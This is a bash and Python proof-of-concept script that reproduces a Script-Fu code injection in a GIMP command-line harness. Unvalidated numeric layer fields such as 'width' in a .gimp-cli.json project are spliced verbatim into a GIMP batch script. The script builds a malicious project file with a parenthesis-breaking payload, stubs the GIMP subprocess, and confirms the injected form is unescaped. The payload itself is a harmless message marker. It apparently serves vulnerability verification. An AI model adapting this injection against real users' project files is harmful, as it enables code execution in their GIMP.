#!/usr/bin/env bash
# Deterministic reproduction for finding-1: Script-Fu code injection via
# unvalidated numeric layer fields in a loaded .gimp-cli.json project.
#
# Exercises the REAL, unmodified production entrypoint
# (cli_anything.gimp.utils.gimp_backend.render_project), the same function
# `gimp export render` calls in production. Only the GIMP subprocess boundary
# (batch_script_fu) is stubbed, because the real gimp binary is not installed
# in this runner -- the vulnerability lives entirely in how the Script-Fu
# SOURCE TEXT is constructed before it is ever handed to that subprocess, so
# stubbing the subprocess call does not touch the code path being verified.
set -euo pipefail

REPO_DIR="$(pwd)"
export PYTHONPATH="$REPO_DIR/gimp/agent-harness"

python3 - <<'PY'
import os, sys, re, uuid

sys.path.insert(0, os.path.join(os.getcwd(), "gimp", "agent-harness"))

from cli_anything.gimp.utils import gimp_backend as gb

captured = {}
nonce = uuid.uuid4().hex[:12]
marker = f'(gimp-message "AEON-POC-INJECTED-{nonce}")'

out_path = os.path.join(os.getcwd(), ".aeon-poc-out", "poc.png")
abs_out = os.path.abspath(out_path)

def fake_batch_script_fu(script, timeout=120):
    # Stand-in for the real GIMP subprocess call (gimp binary unavailable
    # here). Capture the exact script text that WOULD be handed to
    # `gimp -i -b <script>` in production, then satisfy render_project's
    # post-condition (output file must exist) so we can inspect the script.
    captured["script"] = script
    os.makedirs(os.path.dirname(abs_out), exist_ok=True)
    with open(abs_out, "wb") as f:
        f.write(b"\x89PNG\r\n\x1a\n")
    return {"command": "gimp [stubbed]", "returncode": 0, "stdout": "", "stderr": ""}

gb.batch_script_fu = fake_batch_script_fu

# Attacker-controlled project file: only "version" and "canvas" are checked
# by open_project(), so this is exactly what a malicious/untrusted
# .gimp-cli.json loaded via `gimp --project evil.json export render out.png`
# would contain.
malicious_width = f'1)) {marker} ((list-ref (list 1'
project = {
    "version": "1.0",
    "canvas": {"width": 100, "height": 100, "color_mode": "RGB", "background": "white", "dpi": 72},
    "layers": [
        {
            "type": "solid",
            "fill": "white",
            "visible": True,
            "name": "x",
            "width": malicious_width,   # attacker string, never int()-checked
            "height": 100,
            "opacity": 1.0,
            "blend_mode": "normal",
            "offset_x": 0,
            "offset_y": 0,
        }
    ],
}

try:
    gb.render_project(project, out_path, preset="png", overwrite=True)
except Exception as e:
    print(f"FAIL: render_project raised unexpectedly: {e!r}", file=sys.stderr)
    sys.exit(1)

script = captured.get("script", "")
if not script:
    print("FAIL: batch_script_fu was never invoked -- no script captured", file=sys.stderr)
    sys.exit(1)

# The attacker's raw string must appear byte-for-byte (proves NO escaping
# was applied to the width field, unlike name/text/font which go through
# _script_fu_escape and would have their quotes/backslashes escaped).
if malicious_width not in script:
    print("FAIL: attacker-controlled width string was not spliced verbatim into the script", file=sys.stderr)
    print(f"script was: {script}", file=sys.stderr)
    sys.exit(1)

# The injected form must appear as its own independent, well-formed
# parenthesized Script-Fu expression in the final script text -- i.e. it
# would be parsed and evaluated by GIMP as a standalone command, not as
# inert data inside a quoted string.
if marker not in script:
    print("FAIL: injected Script-Fu form not present in generated script", file=sys.stderr)
    sys.exit(1)

quoted_marker = marker.replace('"', '\\"')
if quoted_marker in script and marker not in script.replace(quoted_marker, ""):
    print("FAIL: injected form appears only in escaped/quoted form (would be inert)", file=sys.stderr)
    sys.exit(1)

# Sanity control: string-typed fields (name) ARE escaped in the same script,
# proving _script_fu_escape exists and works -- the gap is specifically that
# it is not applied to width/height/opacity/offset_x/offset_y/font_size.
if '\\"' not in script:
    print("FAIL: control check failed -- expected escaped string content from name/text fields not found", file=sys.stderr)
    sys.exit(1)

print(f"REPRODUCED: injected Script-Fu form present verbatim and unescaped in the generated batch script")
print(f"marker: {marker}")
print(f"script (truncated 400 chars): {script[:400]}")
sys.exit(0)
PY
